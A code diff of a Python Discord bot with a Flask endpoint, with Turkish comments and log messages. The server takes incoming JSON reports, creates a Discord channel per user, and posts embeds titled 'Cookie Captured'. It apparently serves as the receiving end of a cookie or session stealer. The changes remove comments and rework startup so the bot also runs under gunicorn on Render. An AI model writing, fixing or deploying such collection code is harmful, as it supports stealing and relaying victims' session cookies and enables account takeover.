@@ -17,22 +17,18 @@ intents = discord.Intents.default()
 bot = commands.Bot(command_prefix="!", intents=intents)
 app = Flask(__name__)
 queue = asyncio.Queue()
-
-# Global değişken: Event loop'u Flask (senkron) thread'inden erişmek için saklıyoruz
 bot_loop = None
 
 @bot.event
 async def on_ready():
     global bot_loop
-    bot_loop = asyncio.get_running_loop()  # Çalışan loop'u al ve globale ata
+    bot_loop = asyncio.get_running_loop()
     print(f"Bot hazır: {bot.user}")
-    
     guild = bot.get_guild(GUILD_ID)
     if guild:
         print(f"Sunucu: {guild.name} (ID: {guild.id})")
     else:
-        print(f"HATA: {GUILD_ID} ID'li sunucu bulunamadı! Bot sunucuda mı?")
-        
+        print(f"HATA: {GUILD_ID} ID'li sunucu bulunamadı!")
     bot_loop.create_task(process_queue())
 
 async def process_queue():
@@ -57,7 +53,7 @@ async def process_queue():
             else:
                 channel = await guild.create_text_channel(channel_name)
                 print(f"Kanal oluşturuldu: {channel_name}")
-                await asyncio.sleep(6)  # Rate limit önlemi
+                await asyncio.sleep(6)
 
             embed = discord.Embed(title="Cookie Captured", color=0x5b8def)
             embed.add_field(name="User", value=f"**{username}**", inline=True)
@@ -79,21 +75,21 @@ async def process_queue():
 def report():
     data = request.get_json(force=True, silent=True) or {}
     print(f"İstek alındı: {data.get('username', '?')}")
-    
-    # bot_loop'un hazır olup olmadığını kontrol et
     if bot_loop is not None:
         asyncio.run_coroutine_threadsafe(queue.put(data), bot_loop)
     else:
-        print("HATA: Bot loop henüz hazır değil! (on_ready bekleniyor)")
-        
+        print("HATA: Bot loop henüz hazır değil!")
     return jsonify({"status": "queued"}), 200
 
-def run_flask():
-    # Sadece yerel testler için (Render'da gunicorn kullanılıyor)
-    app.run(host="127.0.0.1", port=8080, debug=False, use_reloader=False)
+# === KRİTİK DEĞİŞİKLİK BURADA ===
+# Gunicorn bu dosyayı import ettiğinde Discord botunu arka planda başlat
+def start_bot():
+    bot.run(TOKEN)
 
-if __name__ == "__main__":
-    # Flask'ı arka plan thread'inde başlat
-    threading.Thread(target=run_flask, daemon=True).start()
-    # Botu ana thread'de başlat
+if os.environ.get("RENDER") or __name__ != "__main__":
+    # Render ortamındaysa veya import ediliyorsa botu arka planda başlat
+    threading.Thread(target=start_bot, daemon=True).start()
+else:
+    # Lokal testte (python bot.py) Flask'ı arka plana al, botu ana thread'de başlat
+    threading.Thread(target=lambda: app.run(host="127.0.0.1", port=8080, use_reloader=False), daemon=True).start()
     bot.run(TOKEN)
